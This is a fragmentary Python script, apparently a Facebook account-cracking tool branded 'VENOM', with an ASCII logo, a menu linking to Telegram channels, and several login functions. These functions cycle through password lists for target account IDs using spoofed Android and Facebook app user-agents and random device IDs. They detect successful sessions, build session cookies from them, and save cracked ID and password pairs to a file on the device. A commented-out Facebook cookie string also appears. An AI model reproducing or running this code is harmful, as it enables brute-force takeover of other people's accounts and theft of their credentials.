...
for nt in range(10000):
    ...
    xx=f"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; PAP5044DUO Build/PrestigioPAP5044DUO) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.15.182;]"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; Lenovo A760 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/91.0.0.6.186;]"
    ruz.append(xd)
...
logo=(f"""
   \033[97;1m
888888 88  dP""b8 888888 88""Yb     
  88   88 dP   `" 88__   88__dP     
  88   88 Yb  "88 88""   88"Yb      
  88   88  YboodP 888888 88  Yb          \033[96;1mVENOM
\033[97;1m••••••••••••••••••••••••••••••••••••••••••••••
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : \033[1;37mAchraf-MR
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐆𝐈𝐓𝐇𝗨𝐁    : \033[1;37m MOHA/AYOUB 
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐒𝐓𝐀𝐓𝗨𝐒    : \033[1;37mFREE
\033[1;32m[\033[1;31m•\033[1;32m] \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : \033[1;37m0.5
        ...
        #    linex()
            ...
            if xd in ['1','01']:
                ...
                menu() 
                 ...
                 os.system('xdg-open https://t.me/VENOMokpy');menu()               
                ...
                #exit()
                 ...
                 os.system('xdg-open https://t.me/vo03p');menu()
            elif xd in ['2','02']:
                 os.system('xdg-open https://t.me/VENOMokpy');menu() 
            elif xd in ['0','00']:
...
import requests, sys, random, uuid, string, time
from string import digits

def api1(ids, names, passlist):
    try:
        global ok, loop, sim_id
        sys.stdout.write('\r\r\033[38;5;48m [\033[38;5;208mVЄИΣМ-𝐌1\033[38;5;48m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        ...
        for pw in passlist:
            ...
            twf = 'Login approval'  # اختصار للتحقق من المصادقة الثنائية

            if 'session_key' in po:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print('\r\r\033[1;32m [VENOM-𝐎𝐊] ' + ids + ' | ' + pas + '\033[1;97m')
                ...
                with open('/sdcard/VENOM-OK.txt', 'a') as f:
                    f.write(ids + '|' + pas + '\n')
                oks.append(ids)
                break
            elif 'checkpoint' in str(po) or 'www.facebook.com' in str(po):
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/160.0.0.30.94;FBBV/93146050;FBDM/{density=1.5,width=854,height=480};FBLC/pt_PT;FBRV/93722336;FBCR/altice MEO;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/FREDDY;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]" +"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=540,height=960};FBLC/pt_PT;FBRV/84966289;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
    ...
    # 'cookie': 'datr=lzPZZQUc9W_mop0LG-416w82; sb=mzPZZQBC3g_Yf9H5_F3dnlwh; ps_n=1; ps_l=1; wd=968x1895; fr=0rRJ5NXxHZ5ChutEj.AWVrGKUDgZ10NmjsMc2rkgyiAH0.Bl2TOX..AAA.0.0.BmRPQL.AWVDFDAsZMw',
...
def api4(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build/NRD9OM) [FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/ com.facebook.katana;FBLC/es_MX;FBBV/ 180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/ Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi- v7a:armeabi;FBDM/ {density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=540,height=960};FBLC/pt_PT;FBRV/84966289;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723423;FBDM/{density=1.5,width=480,height=800};FBLC/it_IT;FBCR/vodafone IT;FBMF/MEDIACOM;FBBD/MTK-6580M;FBPN/com.facebook.katana;FBDV/M-PPxB400;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/87.0.0.3.78;FBBV/34180696;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Claro AR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320M;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
